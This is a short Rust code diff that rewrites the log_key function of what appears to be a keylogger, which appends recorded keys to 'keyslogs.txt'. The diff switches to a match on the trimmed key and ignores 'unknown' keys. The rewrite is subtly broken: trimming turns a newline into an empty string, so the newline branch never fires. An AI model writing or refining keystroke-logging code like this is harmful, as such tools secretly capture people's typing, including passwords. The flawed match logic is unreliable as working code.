@@ -56,13 +56,17 @@ fn log_key(key: &str) {
         .open("keyslogs.txt")
         .unwrap();
 
-    if key == "\n" {
-        if let Err(e) = writeln!(file, "{}", key) {
-            eprintln!("Couldn't write to file: {}", e);
+    match key.trim() {
+        "\n" => {
+            if let Err(e) = writeln!(file, "{}", key) {
+                eprintln!("Couldn't write to file: {}", e);
+            }
         }
-    } else {
-        if let Err(e) = write!(file, "{}", key) {
-            eprintln!("Couldn't write to file: {}", e);
+        "unknown" => {}
+        _ => {
+            if let Err(e) = write!(file, "{}", key) {
+                eprintln!("Couldn't write to file: {}", e);
+            }
         }
     }
 }
